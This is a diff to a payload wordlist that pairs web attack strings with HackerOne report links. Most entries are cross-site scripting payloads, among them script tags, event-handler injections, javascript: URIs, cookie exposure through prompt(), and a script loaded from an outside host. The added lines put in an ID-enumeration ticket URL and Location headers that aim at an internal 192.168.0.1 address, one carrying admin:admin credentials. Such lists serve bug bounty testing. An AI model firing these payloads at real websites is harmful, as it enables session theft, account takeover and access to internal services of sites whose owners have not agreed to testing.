@@ -81,6 +81,7 @@ https://target.com/videos/pop-up-shop?x=');alert(1)//	https://hackerone.com/repo
 "><script src=//u00f1.xyz>	https://hackerone.com/reports/88088
 "onmouseover="alert(document.domain)&#x2f;	https://hackerone.com/reports/88105
 javascript:	https://hackerone.com/reports/88719
+https://target.com/my-account/tickets/?id=340529	https://hackerone.com/reports/91599
 <svg onload=eval(name)></svg>	https://hackerone.com/reports/96229
 prompt(document.domain,document.cookie)	https://hackerone.com/reports/96229
 prompt(document.domain, document.cookie)	https://hackerone.com/reports/96229
@@ -177,6 +178,8 @@ https://target.com/partners/apex/Cloud_chat?endpoint=javascript:alert(document.d
 "><marquee>XSS here	https://hackerone.com/reports/179426
 ";alert("XSS in "+document.domain);//	https://hackerone.com/reports/181816
 Address.AddressName=bbbbb%22%3E&Address.FirstName=z%22 onmouseover="alert('Hackerone')" style="position:fixed;left:0;top:0;width:9999px;height:9999px;">&Address.LastName=bbbbb%22%3E&Address.Country=US&Address.AddressLine1=bbbbb%22%3E&Address.AddressLine2=aaaa%22%3E&Address.City=aaaa%22%3E&Address.CountrySubdivision=AK&Address.PostalCode=75000&Address.PhoneNumber=███████&Address.PhoneExtension=&Address.AddressType=Registration&Address.AddressId=32ecef14-f8af-4b5e-adad-d8d2adc8ddad&Address.Verific	https://hackerone.com/reports/186554
+Location: http://192.168.0.1:12345	https://hackerone.com/reports/187520
+Location: http://admin:admin@192.168.0.1:12345	https://hackerone.com/reports/187520
 <script>alert(2);</script>	https://hackerone.com/reports/189378
 <html onmouseover=alert(1)>	https://hackerone.com/reports/189378
 </title></head><html onmouseover=alert(2)>	https://hackerone.com/reports/189378
